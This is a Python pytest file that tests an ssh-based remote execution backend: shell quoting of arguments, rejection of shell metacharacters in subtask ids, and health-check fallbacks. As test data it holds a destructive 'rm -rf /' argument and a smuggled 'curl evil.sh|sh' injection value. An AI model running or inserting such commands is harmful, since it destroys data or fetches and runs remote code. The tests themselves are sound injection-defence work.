"""RemoteEnvironment stubs: ssh command construction + clean degrade when host/SDK absent."""
import shlex
from types import SimpleNamespace
from unittest import mock

import config
from platform_core.execution.backends import remote as rm
from platform_core.execution.environment import Capability


def test_healthcheck_false_when_no_host():
    with mock.patch.object(config, "EXECUTION_REMOTE_HOST", ""):
        assert rm.RemoteEnvironment().healthCheck() is False


def test_healthcheck_true_when_host_reachable():
    with mock.patch.object(config, "EXECUTION_REMOTE_HOST", "box.example"), \
         mock.patch.object(config, "EXECUTION_REMOTE_KIND", "ssh"), \
         mock.patch.object(rm, "_run_remote",
                           return_value=SimpleNamespace(returncode=0, stdout="ok", stderr="")):
        assert rm.RemoteEnvironment().healthCheck() is True


def test_provision_records_host_and_ephemeral_caps():
    with mock.patch.object(config, "EXECUTION_REMOTE_HOST", "box.example"), \
         mock.patch.object(config, "EXECUTION_REMOTE_KIND", "ssh"), \
         mock.patch.object(rm, "_run_remote",
                           return_value=SimpleNamespace(returncode=0, stdout="/remote/work", stderr="")):
        h = rm.RemoteEnvironment().provision(task_state=None, subtask={"subtask_id": "s1"},
                                             base_dir="/repo", policy=None)
    assert h.meta["host"] == "box.example"
    assert h.backend == "remote"
    assert Capability.PERSISTENT not in h.capabilities


def test_wraplauncher_prefixes_ssh():
    with mock.patch.object(config, "EXECUTION_REMOTE_HOST", "box.example"), \
         mock.patch.object(config, "EXECUTION_REMOTE_KIND", "ssh"):
        _env = rm.RemoteEnvironment()
    # build a handle directly to test wrapLauncher in isolation. work_dir is now the LOCAL
    # base_dir (the ssh CLIENT subprocess's cwd), not the remote path -- mirrors docker.py/
    # local.py, both of which set work_dir=base_dir.
    from platform_core.execution.environment import EnvHandle
    handle = EnvHandle(work_dir="/repo", backend="remote",
                       meta={"host": "box.example", "kind": "ssh", "remote_work": "/remote/work",
                             "base_dir": "/repo"},
                       capabilities=Capability.EXEC)
    out_cmd, out_work = rm.RemoteEnvironment().wrapLauncher(["claude", "--print"], handle)
    assert out_cmd[0] == "ssh"
    assert out_cmd[1] == "box.example"
    assert out_cmd[2] == "cd /remote/work && claude --print"
    assert out_work == "/repo"


def test_wraplauncher_shell_quotes_command_elements():
    # A run_cmd element with spaces/quotes must not be reinterpreted as extra shell syntax by
    # the remote shell -- ssh flattens argv-after-host into ONE string it re-parses.
    from platform_core.execution.environment import EnvHandle
    handle = EnvHandle(work_dir="/repo", backend="remote",
                       meta={"host": "box.example", "kind": "ssh", "remote_work": "/tmp/9to5-s1",
                             "base_dir": "/repo"},
                       capabilities=Capability.EXEC)
    out_cmd, _ = rm.RemoteEnvironment().wrapLauncher(
        ["echo", "hello; rm -rf /", "a b"], handle)
    remote_cmd = out_cmd[2]
    # Re-parsing the flattened remote command line must recover the ORIGINAL argv elements --
    # "hello; rm -rf /" must round-trip as ONE argument, never split into separate shell tokens.
    assert shlex.split(remote_cmd)[-2:] == ["hello; rm -rf /", "a b"]


def test_provision_rejects_unsafe_subtask_id():
    # Remote command injection: mkdir/cd/rm-rf commands embed subtask_id -- a value with shell
    # metacharacters must be rejected, not silently interpolated. provision() raising here means
    # router.provision()'s existing try/except degrades cleanly to LocalEnvironment.
    with mock.patch.object(config, "EXECUTION_REMOTE_HOST", "box.example"), \
         mock.patch.object(config, "EXECUTION_REMOTE_KIND", "ssh"), \
         mock.patch.object(rm, "_run_remote") as run_remote:
        with __import__("pytest").raises(ValueError):
            rm.RemoteEnvironment().provision(
                task_state=None, subtask={"subtask_id": "x; curl evil.sh|sh #"},
                base_dir="/repo", policy=None)
    run_remote.assert_not_called()


def test_provision_work_dir_is_local_base_dir_not_remote_path():
    # BUG: work_dir used to be the REMOTE path, but it's passed as `cwd=` to a LOCAL
    # subprocess.Popen(["ssh", ...]) later -- every attempt failed immediately at process
    # launch, silently defeating the "fabric never blocks a run" fallback guarantee.
    with mock.patch.object(config, "EXECUTION_REMOTE_HOST", "box.example"), \
         mock.patch.object(config, "EXECUTION_REMOTE_KIND", "ssh"), \
         mock.patch.object(rm, "_run_remote",
                           return_value=SimpleNamespace(returncode=0, stdout="", stderr="")):
        h = rm.RemoteEnvironment().provision(task_state=None, subtask={"subtask_id": "s1"},
                                             base_dir="/repo", policy=None)
    assert h.work_dir == "/repo"
    assert h.meta["remote_work"] == "/tmp/9to5-s1"


def test_provision_rejects_network_disabled_policy():
    policy = SimpleNamespace(network=False)
    with mock.patch.object(config, "EXECUTION_REMOTE_HOST", "box.example"), \
         mock.patch.object(config, "EXECUTION_REMOTE_KIND", "ssh"), \
         mock.patch.object(rm, "_run_remote") as run_remote:
        with __import__("pytest").raises(rm.MountSecurityError):
            rm.RemoteEnvironment().provision(task_state=None, subtask={"subtask_id": "s1"},
                                             base_dir="/repo", policy=policy)
    run_remote.assert_not_called()


def test_unknown_kind_degrades_healthcheck_false():
    with mock.patch.object(config, "EXECUTION_REMOTE_HOST", "box.example"), \
         mock.patch.object(config, "EXECUTION_REMOTE_KIND", "modal"), \
         mock.patch.object(rm, "_run_remote", side_effect=RuntimeError("SDK not installed")):
        assert rm.RemoteEnvironment().healthCheck() is False
